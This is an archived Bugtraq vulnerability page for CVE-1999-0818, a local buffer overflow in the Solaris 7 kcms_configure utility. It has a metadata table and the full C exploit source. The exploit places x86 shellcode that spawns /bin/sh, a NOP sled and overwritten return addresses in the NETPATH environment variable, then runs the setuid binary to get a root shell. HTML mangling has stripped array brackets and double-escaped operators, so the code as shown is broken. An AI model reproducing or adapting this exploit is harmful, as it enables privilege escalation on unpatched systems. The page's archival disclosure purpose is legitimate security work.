<p><b><span style="font-size: 18pt;">Solaris kcms_configure</span></b></p><br><br><a href="http://www.securityfocus.com/bid/831/info">info</a><br><a href="http://www.securityfocus.com/bid/831/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/831/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/831/solution">solution</a><br><a href="http://www.securityfocus.com/bid/831/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				831
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-1999-0818<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Nov 30 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 11 2009 12:56AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This was first posted to BugTraq by UNYUN &lt;shadowpenguin@backsection.net&gt; on November 30, 1999.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun Solaris  7.0_x86<br/>
					
				
					Sun Solaris  7.0<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	------ ex_kcms_configure86.c<br/>/*=============================================================================<br/>   kcms_configure Exploit for Solaris7 Intel Edition<br/>   The Shadow Penguin Security (http://shadowpenguin.backsection.net)<br/>   Written by UNYUN (shadowpenguin@backsection.net)<br/>  =============================================================================<br/>*/<br/><br/>#define ENV     "NETPATH="<br/>#define MAXBUF  3000<br/>#define RETADR  2088<br/>#define RETOFS  0xad0<br/>#define FAKEADR 2076<br/>#define NOP 0x90<br/><br/>unsigned long get_sp(void)<br/>{<br/>  __asm__(" movl %esp,%eax ");<br/>}<br/><br/>char exploit_code =<br/>"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"<br/>"\x8d\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"<br/>"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"<br/>"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"<br/>"\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33"<br/>"\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88"<br/>"\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f"<br/>"\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46"<br/>"\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01"<br/>"\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/sh";<br/><br/>main()<br/>{<br/>    char            bufMAXBUF;<br/>    unsigned int    i,ip,sp;<br/><br/>    putenv("LANG=");<br/>    sp=get_sp();<br/>    printf("ESP=0x%x\n",sp);<br/><br/>    memset(buf,NOP,MAXBUF);<br/><br/>    ip=sp;<br/>    bufFAKEADR  =ip&amp;amp;0xff;<br/>    bufFAKEADR+1=(ip&amp;gt;&amp;gt;8)&amp;amp;0xff;<br/>    bufFAKEADR+2=(ip&amp;gt;&amp;gt;16)&amp;amp;0xff;<br/>    bufFAKEADR+3=(ip&amp;gt;&amp;gt;24)&amp;amp;0xff;<br/><br/>    ip=sp-RETOFS;<br/>    bufRETADR  =ip&amp;amp;0xff;<br/>    bufRETADR+1=(ip&amp;gt;&amp;gt;8)&amp;amp;0xff;<br/>    bufRETADR+2=(ip&amp;gt;&amp;gt;16)&amp;amp;0xff;<br/>    bufRETADR+3=(ip&amp;gt;&amp;gt;24)&amp;amp;0xff;<br/><br/>    strncpy(buf+2500,exploit_code,strlen(exploit_code));<br/><br/>    strncpy(buf,ENV,strlen(ENV));<br/>    bufMAXBUF-1=0;<br/>    putenv(buf);<br/><br/>    execl("/usr/openwin/bin/kcms_configure","kcms_configure","1",0);<br/>}
	
		<ul>
</ul>
</div>